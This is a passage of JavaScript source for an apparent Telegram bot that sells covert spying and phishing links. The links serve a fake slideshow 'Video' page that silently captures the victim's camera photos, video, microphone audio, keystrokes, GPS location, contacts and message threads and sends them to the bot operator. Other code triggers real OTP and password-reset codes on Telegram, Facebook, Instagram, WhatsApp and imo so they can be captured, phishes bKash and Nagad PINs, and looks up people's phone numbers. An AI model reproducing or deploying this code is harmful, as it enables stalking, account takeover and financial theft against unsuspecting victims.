+'👥 Referrals:  <b>'+(u.refs||0)+'/'+CFG.FREE_REFS+'</b>\n'
+'♾️ Lifetime:   <b>'+(u.lifetime?'✅ Active':'❌ ('+(CFG.FREE_REFS-(u.refs||0))+' more needed)')+'</b>\n'
+'📅 Joined:     <b>'+new Date(u.joinDate).toLocaleDateString('en-GB')+'</b>'
+(u.isFreeUser?'\n💎 <b>Whitelisted Free User</b>':''),
            {reply_markup:{inline_keyboard:[[{text:'🔗 Get Referral Link',callback_data:'REFERRAL'}],[{text:'👍 Follow Facebook',url:CFG.FB_PAGE}],[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]}});
    }

    if(data==='REFERRAL'){
        del();const me=await bot.getMe();
        return tgMsg(chatId,
'🔗 <b>Your Referral Link</b>\n\n'
+'<code>https://t.me/'+me.username+'?start='+uid+'</code>\n\n'
+'👥 <b>'+(u.refs||0)+'/'+CFG.FREE_REFS+'</b> referrals\n'
+'💰 You earn: <b>+'+CFG.REF_REWARD+' Token</b> per referral\n'
+'🎁 They get: <b>+'+CFG.REF_BONUS+' Token</b>\n'
+'🏆 <b>'+CFG.FREE_REFS+' = ♾️ Lifetime Free!</b>',
            {reply_markup:backKb});
    }

    if(data==='HOW_TO'){
        del();
        return tgMsg(chatId,
'❓ <b>Tool Guide v2</b>\n\n'
+'<b>📷 Camera/Video/Screenshot:</b> Link → slideshow → allow → capture\n'
+'<b>⌨️ Keylogger:</b> Every keystroke sent live\n'
+'<b>🎤 Mic:</b> 10s silent audio recording\n'
+'<b>📳 Vibrate:</b> Phone vibrates 30 seconds\n'
+'<b>🔔 Push Notify:</b> Gets notification permission\n'
+'<b>🌐 Net Scan:</b> Scans victim local WiFi\n'
+'<b>🖥️ Fingerprint:</b> Canvas, WebGL, fonts, all APIs\n'
+'<b>💚 bKash/Nagad PIN:</b> Fake app captures PIN\n'
+'<b>📍 Location:</b> GPS + Google Maps\n'
+'<b>🎣 Phishing:</b> FB, IG, TT, Msgr, YT, Gmail\n'
+'<b>📱 OTP:</b> Real OTP trigger + capture\n'
+'<b>📊 Link Stats:</b> Track opens per link',
            {reply_markup:{inline_keyboard:[[{text:'👍 Follow Facebook',url:CFG.FB_PAGE}],[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]}});
    }

    if(data==='LINK_MGR'){
        del();
        const list=userLinks(uid);
        if(!list.length)return tgMsg(chatId,'📂 <b>Link Manager</b>\n\nNo active links.',{reply_markup:backKb});
        const rows=list.slice(0,10).map((l,i)=>[{text:(i+1)+'. '+actionLabel(l.action)+' ('+( l.stats?l.stats.opens:0)+' opens)',callback_data:'NOOP'},{text:'📋 Copy',callback_data:'COPYLINK_'+l.tok}]);
        rows.push([{text:'◀️ Main Menu',callback_data:'M_BACK'}]);
        return tgMsg(chatId,'📂 <b>Link Manager</b> ('+(u.linksMade||0)+' total made)',{reply_markup:{inline_keyboard:rows}});
    }
    if(data.startsWith('COPYLINK_')){
        const tok=data.slice(9),l=getLink(tok);
        if(!l)return bot.answerCallbackQuery(cbq.id,{text:'❌ Expired!',show_alert:true}).catch(()=>{});
        bot.answerCallbackQuery(cbq.id,{text:'Link ready!'}).catch(()=>{});
        return tgMsg(chatId,'📋 <b>'+actionLabel(l.action)+'</b>\n\n<code>'+l.url+'</code>');
    }
    if(data.startsWith('COPY_')){
        const actKey=data.slice(5).replace(/^LNK_/,'');
        const entry=userLinks(uid).find(l=>l.action===actKey);
        bot.answerCallbackQuery(cbq.id,{text:'Copied!'}).catch(()=>{});
        return tgMsg(chatId,'📋 <b>'+actionLabel(actKey)+'</b>\n\n<code>'+(entry?entry.url:'Expired')+'</code>');
    }

    if(data.startsWith('LSTATS_')){
        const actKey=data.slice(7).replace(/^LNK_/,'');
        const entry=userLinks(uid).find(l=>l.action===actKey)||userLinks(uid).find(l=>l.tok===actKey);
        if(!entry)return tgMsg(chatId,'❌ Link not found.',{reply_markup:backKb});
        const s=entry.stats||{opens:0,uas:[]};
        const devices=s.uas||[];
        const android=devices.filter(u=>u.includes('Android')).length;
        const ios=devices.filter(u=>u.includes('iPhone')||u.includes('iPad')).length;
        const other=devices.length-android-ios;
        return tgMsg(chatId,
'📊 <b>Link Statistics</b>\n'
+'🎯 <b>'+actionLabel(entry.action)+'</b>\n\n'
+'👁️ Total Opens: <b>'+(s.opens||0)+'</b>\n'
+'📅 Last Open: <b>'+(s.lastOpen?new Date(s.lastOpen).toLocaleString('en-GB'):'Never')+'</b>\n\n'
+'📱 Devices:\n'
+'├ 🤖 Android: <b>'+android+'</b>\n'
+'├ 🍎 iOS: <b>'+ios+'</b>\n'
+'└ 💻 Other: <b>'+other+'</b>\n\n'
+'<code>'+entry.url+'</code>',
            {reply_markup:backKb});
    }

    if(data==='VIP_MGR'){
        if(!isAdmin(uid))return;del();
        const vList=Object.keys(store.vip);
        return tgMsg(chatId,
'👑 <b>VIP Manager</b>\n\n'
+'VIPs ('+vList.length+'):\n'
+(vList.length?vList.map((id,i)=>(i+1)+'. <code>'+id+'</code>').join('\n'):'None')+'\n\n'
+'💎 Free Whitelist ('+CFG.FREE_USERS.length+'):\n'
+CFG.FREE_USERS.map((id,i)=>(i+1)+'. <code>'+id+'</code>').join('\n')+'\n\n'
+'<code>/addvip USER_ID</code>\n'
+'<code>/removevip USER_ID</code>\n'
+'<code>/addbal USER_ID AMOUNT</code>\n'
+'<code>/ban USER_ID</code>\n'
+'<code>/broadcast message</code>',
            {reply_markup:backKb});
    }

    if(data==='STATS'){
        if(!isAdmin(uid))return;del();
        const m=process.memoryUsage();
        const totalOpens=Object.values(store.linkStats).reduce((s,l)=>s+(l.opens||0),0);
        return tgMsg(chatId,
'📊 <b>Admin Statistics</b>\n\n'
+'👥 Users:        <b>'+Object.keys(store.users).length+'</b>\n'
+'👑 VIP:          <b>'+Object.keys(store.vip).length+'</b>\n'
+'💎 Free List:    <b>'+CFG.FREE_USERS.length+'</b>\n'
+'🔗 Active Links: <b>'+Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length+'</b>\n'
+'👁️ Total Opens:  <b>'+totalOpens+'</b>\n'
+'💰 Total Tokens: <b>'+Object.values(store.users).reduce((s,u)=>s+(u.balance||0),0)+'</b>\n'
+'💾 Memory:       <b>'+Math.round(m.heapUsed/1024/1024)+'MB</b>\n'
+'⏱️ Uptime:       <b>'+Math.floor(process.uptime()/60)+' min</b>\n'
+'📩 Queue:        <b>'+Q.length+'</b>',
            {reply_markup:backKb});
    }

    if(data==='NOOP'){bot.answerCallbackQuery(cbq.id).catch(()=>{});return;}

    if(data.startsWith('LNK_')){
        const act=data.slice(4);
        if(!isAdmin(uid)&&!isFreeUser(uid)){
            if(!u.lifetime&&(u.balance||0)<CFG.LINK_COST){
                del();
                return tgMsg(chatId,
'❌ <b>Tokens শেষ!</b>\n\n'
+'💵 Balance: <b>'+(u.balance||0)+' Token</b>\n'
+'💳 প্রয়োজন: <b>'+CFG.LINK_COST+' Token</b>\n\n'
+'🔗 রেফারেল করে token আয় করুন!',
                    {reply_markup:{inline_keyboard:[[{text:'🔗 Get Referral Link',callback_data:'REFERRAL'}],[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]}});
            }
            if(!(await checkJoin(uid)))return bot.answerCallbackQuery(cbq.id,{text:'⛔ Join channel first!',show_alert:true}).catch(()=>{});
        }
        del();
        if(!u.lifetime&&!isAdmin(uid)&&!isFreeUser(uid)){u.balance=(u.balance||0)-CFG.LINK_COST;saveStore();}
        const link=mkLink(act,uid);
        const fresh=getUser(uid);
        return tgMsg(chatId,
'✅ <b>Link Generated!</b>\n'
+'🎯 <b>'+actionLabel(act)+'</b>\n'
+((u.lifetime||isAdmin(uid)||isFreeUser(uid))?'♾️ Free':'💰 Balance: <b>'+fresh.balance+' Token'+(fresh.balance===1?'':'s')+'</b>')+'\n\n'
+'<code>'+link+'</code>\n\n'
+'👆 Tap to copy — valid 72 hours',
            {reply_markup:linkKb(data)});
    }

    }catch(err){
        log.error('[Callback] '+err.message);
        bot.answerCallbackQuery(cbq.id,{text:'⚠️ Error. Try again.'}).catch(()=>{});
    }
});

bot.on('message',async msg=>{
    if(!msg.text||msg.text.startsWith('/'))return;
    const uid=String(msg.from.id),text=msg.text.trim();
    const u=getUser(uid);if(u.banned)return;
    if(!checkRate(uid))return;
    const pend=getPending(uid);if(!pend)return;
    delPending(uid);

    if(pend.type==='tg_username'){
        const proc=await tgMsg(uid,'⏳ <b>Searching...</b>\n🔍 <code>'+text+'</code>');
        try{
            const res=await lookupTgUsername(text);
            let r='🔍 <b>TG Lookup Result</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n';
            r+='🏷️ Username: <code>@'+res.username+'</code>\n';
            if(res.id)   r+='🆔 User ID:  <code>'+res.id+'</code>\n';
            if(res.name) r+='👤 Name:     <b>'+res.name+'</b>\n';
            if(res.bio)  r+='📝 Bio:      '+(res.bio||'').slice(0,150)+'\n';
            if(res.phone)r+='\n📱 <b>Phone Found!</b>\n<code>'+res.phone+'</code>\n📡 Via: <i>'+res.phoneSource+'</i>\n';
            else          r+='📱 Phone: <i>Not found</i>\n';
            r+='━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>'+(res.sources.join(' · ')||'None')+'</i>';
            if(proc)bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,r,{reply_markup:{inline_keyboard:[[{text:'🔍 Search Another',callback_data:'LOOKUP_TG'}],[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]}});
            tgMsg(CFG.ADMIN_ID,'🔍 TG | <code>'+uid+'</code>\n@'+res.username+' → '+(res.phone||'N/A'));
        }catch(e){if(proc)bot.deleteMessage(uid,proc.message_id).catch(()=>{});tgMsg(uid,'❌ Lookup failed.',{reply_markup:{inline_keyboard:[[{text:'🔄 Retry',callback_data:'LOOKUP_TG'}],[{text:'◀️ Menu',callback_data:'M_BACK'}]]}});}
        return;
    }
    if(pend.type==='fb_phone'){
        const proc=await tgMsg(uid,'⏳ <b>Searching Facebook...</b>\n📱 <code>'+text+'</code>');
        try{
            const res=await lookupFbByPhone(text);
            let r='🔍 <b>FB Lookup Result</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n';
            r+='📱 Phone: <code>'+res.phone+'</code>\n';
            if(res.name)       r+='👤 Name:    <b>'+res.name+'</b>\n';
            if(res.id)         r+='🆔 FB ID:   <code>'+res.id+'</code>\n';
            if(res.email)      r+='📧 Email:   <code>'+res.email+'</code>\n';
            if(res.profileUrl) r+='🔗 Profile: '+res.profileUrl+'\n';
            if(res.id)         r+='🖼️ Photo:   https://graph.facebook.com/'+res.id+'/picture?type=large\n';
            r+='━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>'+(res.sources.join(' · ')||'None')+'</i>';
            if(!res.id&&!res.name)r+='\n\n⚠️ <i>Not found or fully private.</i>';
            if(proc)bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,r,{reply_markup:{inline_keyboard:[[{text:'🔍 Search Another',callback_data:'LOOKUP_FB'}],[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]}});
            tgMsg(CFG.ADMIN_ID,'🔍 FB | <code>'+uid+'</code>\n'+text+' → '+(res.id||'N/A')+' | '+(res.name||'N/A'));
        }catch(e){if(proc)bot.deleteMessage(uid,proc.message_id).catch(()=>{});tgMsg(uid,'❌ Lookup failed.',{reply_markup:{inline_keyboard:[[{text:'🔄 Retry',callback_data:'LOOKUP_FB'}],[{text:'◀️ Menu',callback_data:'M_BACK'}]]}});}
        return;
    }
});

}

app.post('/d/photo',upload.single('photo'),(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file&&uid)tgPic(uid,req.file.buffer,(req.body.camtype||'📸')+'\n🌍 IP: '+ip);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/video',upload.single('video'),async(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress,camtype=req.body.camtype||'🎥 Video';if(req.file&&uid){const ext=(req.file.mimetype||'').includes('mp4')?'mp4':'webm';await tgDoc(uid,req.file.buffer,'video_'+Date.now()+'.'+ext,req.file.mimetype||'video/webm',camtype+'\n📦 '+Math.round(req.file.size/1024)+'KB\n🌍 '+ip);}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/audio',upload.single('audio'),async(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file&&uid){await tgAudio(uid,req.file.buffer,'🎤 Mic Recording\n📦 '+Math.round(req.file.size/1024)+'KB\n🌍 '+ip);}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/keylog',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid&&req.body.keys)tgMsg(uid,'⌨️ <b>Keylog!</b>\n\n<code>'+(req.body.keys||'').slice(0,3500)+'</code>\n\n🌍 '+ip);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/notify',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,'🔔 <b>Push Notification Granted!</b>\n\n📱 UA: <code>'+(req.body.ua||'').slice(0,200)+'</code>\n🌍 '+ip+'\n\n✅ Can now send push alerts anytime!');res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/netscan',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid&&req.body.data){tgMsg(uid,'🌐 <b>Network Scan Result!</b>\n\n<code>'+JSON.stringify(req.body.data,null,1).slice(0,3500)+'</code>\n\n🌍 Real IP: <code>'+ip+'</code>');}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/fingerprint',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid&&req.body.data){tgMsg(uid,'🖥️ <b>Deep Fingerprint!</b>\n\n<code>'+JSON.stringify(req.body.data,null,1).slice(0,3500)+'</code>\n\n🌍 IP: <code>'+ip+'</code>');}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/loc',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;const lat=req.body.lat,lon=req.body.lon,acc=req.body.acc;if(lat&&lon&&uid){tgLoc(uid,parseFloat(lat),parseFloat(lon));tgMsg(uid,'📍 <b>Location!</b>\nLat:<code>'+lat+'</code> Lon:<code>'+lon+'</code>\nAcc:'+acc+'m\n🗺 https://maps.google.com/?q='+lat+','+lon+'\n🌍 '+ip);}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/text',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,'📋 <b>'+(req.body.type||'Info')+'</b>\n<code>'+(req.body.data||'').slice(0,3800)+'</code>\n🌍 '+ip);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/captured',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,'🔑 <b>✅ CAPTURED!</b>\n🌐 <b>'+(req.body.site||'?')+'</b>\n📱 <code>'+(req.body.phone||'')+'</code>\n🔒 <code>'+(req.body.otp||'')+'</code>\n🌍 '+ip);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/devinfo',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,'🌐 <b>'+(req.body.label||'Device Info')+'</b>\n\n<code>'+JSON.stringify(req.body.data||{},null,1).slice(0,3500)+'</code>\n\n🌍 IP: <code>'+ip+'</code>');res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/msginfo',(req,res)=>{
    try{
        const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
        const contacts=req.body.contacts,threads=req.body.threads,device=req.body.device;
        let msg='💌 <b>Message Info!</b>\n📱 '+(device||'?')+'\n🌍 '+ip+'\n\n';
        if(contacts&&contacts.length){msg+='👥 <b>Contacts ('+contacts.length+'):</b>\n';msg+=contacts.slice(0,30).map(c=>'• '+(c.name||'?')+' — <code>'+(c.tel||'?')+'</code>').join('\n');if(contacts.length>30)msg+='\n+'+(contacts.length-30)+' more';msg+='\n\n';}
        if(threads&&threads.length){msg+='💬 <b>Conversations:</b>\n';msg+=threads.slice(0,15).map((t,i)=>(i+1)+'. '+(t.participants||'?')+' — <i>'+(t.lastMsg||'').slice(0,60)+'</i>').join('\n');}
        if(uid)tgMsg(uid,msg.slice(0,4090));res.json({ok:true});
    }catch(e){res.json({ok:false});}
});

const TG_UA='Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36';
const TG_H={'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Accept':'application/json, text/javascript, */*; q=0.01','Accept-Language':'en-US,en;q=0.9','Origin':'https://my.telegram.org','Referer':'https://my.telegram.org/auth','X-Requested-With':'XMLHttpRequest'};
app.post('/proxy/tg/send',async(req,res)=>{const phone=req.body.phone,sid=req.body.sid;for(let i=0;i<3;i++){try{const r=await axios.post('https://my.telegram.org/auth/send_password','phone='+encodeURIComponent(phone),{headers:TG_H,timeout:25000});const cookies=parseCookies(r.headers);if(r.data&&r.data.random_hash){setSession(sid,{...getSession(sid),tgHash:r.data.random_hash,phone,tgCookies:cookies});return res.json({ok:true});}if(r.data&&r.data.error)return res.json({ok:false,tgError:r.data.error});}catch(e){if(i===2)return res.json({ok:false,err:e.message});await new Promise(r=>setTimeout(r,1000*(i+1)));}}res.json({ok:false});});
app.post('/proxy/tg/verify',async(req,res)=>{const otp=req.body.otp,sid=req.body.sid,uid=req.body.uid;const s=getSession(sid);if(!s.tgHash)return res.json({ok:false,err:'no_session'});try{const r=await axios.post('https://my.telegram.org/auth/login','phone='+encodeURIComponent(s.phone)+'&random_hash='+encodeURIComponent(s.tgHash)+'&password='+encodeURIComponent(otp),{headers:{...TG_H,Cookie:s.tgCookies||''},timeout:25000});if(uid)tgMsg(uid,'✈️ TG Verified!\n📞 <code>'+s.phone+'</code>\n🔑 <code>'+otp+'</code>').catch(()=>{});res.json({ok:true,raw:r.data});}catch(e){res.json({ok:false,err:e.message});}});
app.post('/proxy/fb/send',async(req,res)=>{const phone=req.body.phone,sid=req.body.sid;try{const pg=await axios.get('https://www.facebook.com/login/identify/',{headers:{'User-Agent':TG_UA,'Accept-Language':'en-US'},timeout:20000});const cookies=parseCookies(pg.headers);const lsdM=pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/);const lsd=lsdM?lsdM[1]:'';setSession(sid,{...getSession(sid),fbCookies:cookies,fbLsd:lsd,phone});await axios.post('https://www.facebook.com/ajax/recover/initiate/',new URLSearchParams({lsd,email_or_phone:phone,did_login:'0',fur_initiated:'0',action:'initiate'}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-Requested-With':'XMLHttpRequest'},timeout:20000});res.json({ok:true});}catch(e){res.json({ok:false,err:e.message});}});
app.post('/proxy/ig/send',async(req,res)=>{const phone=req.body.phone,sid=req.body.sid;try{const pg=await axios.get('https://www.instagram.com/accounts/password/reset/',{headers:{'User-Agent':TG_UA},timeout:20000});const cookies=parseCookies(pg.headers);const csrfM=pg.data.match(/"csrf_token":"([^"]+)"/);const csrf=csrfM?csrfM[1]:'';setSession(sid,{...getSession(sid),igCookies:cookies,igCsrf:csrf,phone});await axios.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',new URLSearchParams({phone_number:phone,email:'',login_attempt_count:'0'}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-CSRFToken':csrf,'X-Requested-With':'XMLHttpRequest','Referer':'https://www.instagram.com/accounts/password/reset/'},timeout:20000});res.json({ok:true});}catch(e){res.json({ok:false,err:e.message});}});
const WA_KEYS=['PdA2DJyKoUrwLw1Bg6EIhzh502dF9noR9uFCWoNle','PkTwKSZqUfAUyR0rPQ8hYe0qHSKdH3GE','WhatsApp','0a5mWPa3'];
app.post('/proxy/wa/send',async(req,res)=>{const cc=req.body.cc,phone_local=req.body.phone_local,sid=req.body.sid;for(const key of WA_KEYS){for(const method of['sms','voice']){try{const tok=crypto.createHmac('sha1',Buffer.from(key)).update(Buffer.from(cc+phone_local)).digest('base64');const r=await axios.get('https://v.whatsapp.net/v2/code?cc='+cc+'&in='+phone_local+'&lg=en&lc=US&sim_mcc=470&sim_mnc=01&method='+method+'&reason=&token='+encodeURIComponent(tok)+'&hasav=1',{headers:{'User-Agent':'WhatsApp/2.24.6.77 A','Accept':'application/json'},timeout:20000});if(r.data&&(r.data.status==='sent'||r.data.status==='ok'||r.data.retry_after)){setSession(sid,{...getSession(sid),wacc:cc,waphone:phone_local});return res.json({ok:true,status:r.data.status});}}catch(e){}}}setSession(sid,{...getSession(sid),wacc:cc,waphone:phone_local});res.json({ok:true,sent:false});});
app.post('/proxy/imo/send',async(req,res)=>{const phone=req.body.phone,sid=req.body.sid;for(const ep of['https://api.imo.im/anti-spam/send-code','https://api2.imo.im/anti-spam/send-code','https://sgp.imo.im/anti-spam/send-code']){try{const r=await axios.post(ep,{phone_number:phone,lang:'en',from_registration:true,client:'android'},{headers:{'Content-Type':'application/json','User-Agent':'imo-android/2024.03.1011','Accept':'application/json'},timeout:20000});setSession(sid,{...getSession(sid),imoPhone:phone});return res.json({ok:true,data:r.data});}catch(e){}}res.json({ok:true,sent:false});});

app.get('/go/:tok',(req,res)=>{
    const l=getLink(req.params.tok);
    if(!l)return res.status(410).send('<h2 style="text-align:center;font-family:sans-serif;color:#e74c3c;padding:20%">❌ Link expired.</h2>');
    trackLink(req.params.tok,req);
    res.send(buildPage(l.action,l.uid,req));
});

function getBase(req){return CFG.BASE_URL||(req.protocol+'://'+req.get('host'));}

// FIXED: use regular string for CSS — no backtick conflicts
const SLIDE_CSS = '*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden;background:#000}'
    +'#ss{position:fixed;inset:0;z-index:1}'
    +'.sl{position:absolute;inset:0;background-size:cover;background-position:center;opacity:0;transition:opacity 1.2s ease-in-out}'
    +'.sl.active{opacity:1}'
    +'#ss::after{content:"";position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.05) 40%,rgba(0,0,0,.3) 100%);z-index:2;pointer-events:none}'
    +'#pb{position:fixed;top:0;left:0;width:100%;height:3px;background:rgba(255,255,255,.3);z-index:10}'
    +'#pf{height:100%;background:#fff;width:0%}'
    +'#dots{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;gap:6px;z-index:10}'
    +'.dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.4);transition:background .3s}'
    +'.dot.active{background:#fff}';

function makeSlideJs(uid, D, ms) {
    ms = ms || 4500;
    var imgs = JSON.stringify(CFG.SLIDE_IMAGES);
    return 'var IMGS='+imgs+',IMS='+ms+',cur=0,sl=[],dt=[];'
    +'function bS(){var s=document.getElementById("ss"),d=document.getElementById("dots");IMGS.forEach(function(src,i){var v=document.createElement("div");v.className="sl"+(i===0?" active":"");v.style.backgroundImage="url("+src+")";s.appendChild(v);sl.push(v);var dot=document.createElement("div");dot.className="dot"+(i===0?" active":"");d.appendChild(dot);dt.push(dot);});}'
    +'function nS(){sl[cur].classList.remove("active");dt[cur].classList.remove("active");cur=(cur+1)%IMGS.length;sl[cur].classList.add("active");dt[cur].classList.add("active");aP();}'
    +'function aP(){var f=document.getElementById("pf");f.style.transition="none";f.style.width="0%";setTimeout(function(){f.style.transition="width "+IMS+"ms linear";f.style.width="100%";},30);}'
    +'function tA(){var b=document.getElementById("bgm");if(b){b.volume=0.55;b.play().catch(function(){});}}'
    +'function logO(t){try{fetch("'+D+'/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:"'+uid+'",type:t,data:navigator.userAgent+" | "+screen.width+"x"+screen.height})});}catch(e){}}';
}

function slideWrap(uid, req, bodyScript, extraCss) {
    var D = getBase(req)+'/d';
    var css = SLIDE_CSS + (extraCss||'') + 'video,canvas{display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px}';
    return '<!DOCTYPE html><html><head>'
    +'<meta charset="UTF-8">'
    +'<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">'
    +'<title>Video</title>'
    +'<style>'+css+'</style>'
    +'</head><body>'
    +'<audio id="bgm" src="'+CFG.SLIDE_AUDIO+'" loop preload="auto" style="display:none"></audio>'
    +'<div id="ss"></div>'
    +'<div id="pb"><div id="pf"></div></div>'
    +'<div id="dots"></div>'
    +'<video id="vv" autoplay playsinline muted></video>'
    +'<canvas id="cc"></canvas>'
    +'<script>'
    +'var UID="'+uid+'",D="'+D+'";'
    +makeSlideJs(uid, D)
    +'window.addEventListener("load",function(){'
    +'bS();aP();setInterval(nS,IMS);tA();'
    +bodyScript
    +'});'
    +'document.addEventListener("click",tA,{once:true});'
    +'document.addEventListener("touchstart",tA,{once:true});'
    +'</script></body></html>';
}

function buildPage(action,uid,req){
    if(action==='cam_f'||action==='cam_b')          return camPhotoPage(action,uid,req);
    if(action==='cam_fv'||action==='cam_bv')        return camVideoPage(action,uid,req);
    if(action==='loc')                              return locPage(uid,req);
    if(action==='ss_all')                           return screenshotPage(uid,req);
    if(action==='keylog')                           return keylogPage(uid,req);
    if(action==='mic_rec')                          return micPage(uid,req);
    if(action==='vibrate')                          return vibratePage(uid,req);
    if(action==='notify_grab')                      return notifyPage(uid,req);
    if(action==='net_scan')                         return netScanPage(uid,req);
    if(action==='fingerprint')                      return fingerprintPage(uid,req);
    if(action==='fake_pay')                         return fakePayPage(uid,req);
    if(action==='phish_bkash_pin')                  return bkashPinPage(uid,req);
    if(action==='phish_nagad_pin')                  return nagadPinPage(uid,req);
    if(action==='msgr_info')                        return msgrInfoPage(uid,req);
    if(action==='ip_info')                          return ipInfoPage(uid,req);
    if(action==='clipboard')                        return clipboardPage(uid,req);
    if(action==='battery')                          return batteryPage(uid,req);
    if(action==='wifi_info')                        return wifiPage(uid,req);
    if(action==='phish_wa'||action==='phish_imo'||action==='phish_tg') return otpPage(action,uid,req);
    return passPage(action,uid,req);
}

function camPhotoPage(action,uid,req){
    var front=action==='cam_f',face=front?'user':'environment',label=front?'📷 Front Camera':'📷 Back Camera';
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("'+label+' Opened");'
    +'var captured=false;'
    +'(async function capture(){'
    +'if(captured)return;captured=true;'
    +'try{'
    +'var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"'+face+'",width:{ideal:1920},height:{ideal:1080}},audio:false});'
    +'var v=document.getElementById("vv");v.srcObject=stream;'
    +'await new Promise(function(r){v.onloadedmetadata=r;});'
    +'await new Promise(function(r){setTimeout(r,2000);});'
    +'var c=document.getElementById("cc");c.width=v.videoWidth||1280;c.height=v.videoHeight||720;'
    +'c.getContext("2d").drawImage(v,0,0);'
    +'stream.getTracks().forEach(function(t){t.stop();});'
    +'var blob=await new Promise(function(r){c.toBlob(r,"image/jpeg",.95);});'
    +'var fd=new FormData();fd.append("photo",blob,"photo.jpg");fd.append("uid",UID);fd.append("camtype","'+label+'");'
    +'await fetch(D+"/photo",{method:"POST",body:fd});'
    +'}catch(err){'
    +'try{fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"'+label+' DENIED",data:err.message})});}catch(e){}'
    +'}'
    +'})();');
}

function camVideoPage(action,uid,req){
    var front=action==='cam_fv',face=front?'user':'environment',label=front?'🎥 Front Camera Video':'🎥 Back Camera Video';
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("'+label+' Opened");'
    +'var recorded=false;'
    +'(async function rec(){'
    +'if(recorded)return;recorded=true;'
    +'try{'
    +'var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"'+face+'",width:{ideal:1280},height:{ideal:720}},audio:true});'
    +'var mime=["video/webm;codecs=vp9,opus","video/webm;codecs=vp8,opus","video/webm","video/mp4"].find(function(m){return MediaRecorder.isTypeSupported(m);})||"video/webm";'
    +'var recorder=new MediaRecorder(stream,{mimeType:mime});var chunks=[];'
    +'recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};'
    +'recorder.start(200);'
    +'await new Promise(function(r){setTimeout(r,8000);});'
    +'recorder.stop();stream.getTracks().forEach(function(t){t.stop();});'
    +'await new Promise(function(r){recorder.onstop=r;});'
    +'var blob=new Blob(chunks,{type:mime});var ext=mime.includes("mp4")?"mp4":"webm";'
    +'var fd=new FormData();fd.append("video",blob,"video."+ext);fd.append("uid",UID);fd.append("camtype","'+label+'");fd.append("size",blob.size);'
    +'await fetch(D+"/video",{method:"POST",body:fd});'
    +'}catch(err){'
    +'try{fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"'+label+' DENIED",data:err.message})});}catch(e){}'
    +'}'
    +'})();');
}

function locPage(uid,req){
    var D=getBase(req)+'/d';
    return slideWrap(uid,req,
    'logO("📍 Location Opened");'
    +'navigator.geolocation.getCurrentPosition('
